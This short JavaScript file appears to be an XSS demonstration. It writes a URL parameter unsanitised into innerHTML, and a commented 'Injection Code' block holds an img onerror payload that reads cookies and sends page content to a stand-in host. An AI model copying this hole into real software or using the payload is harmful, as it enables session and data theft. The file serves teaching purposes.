// Function to set a cookie, mostly this will be set from server
function setCookie(name, value, days) {
  const date = new Date();
  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
  const expires = "expires=" + date.toUTCString();
  document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

// Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
setCookie("exampleCookie", "Hello, Cookie!", 7);

const params = new URLSearchParams(window.location.search);
const name = params.get("name");
document.getElementById("nameSpan").innerHTML = name;

function createPost(title, description) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/post", true);
  console.log(document.cookie);
  xhr.withCredentials = true;
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send(`txtName=${title}&mtxMessage=${description}`);
}

// Injection Code
{
  /* <img src='empty.gif' onerror="var mycookie=document.cookie; new Image().src='https://example.php?output=${document.body.innerHTML}':"/> */
}
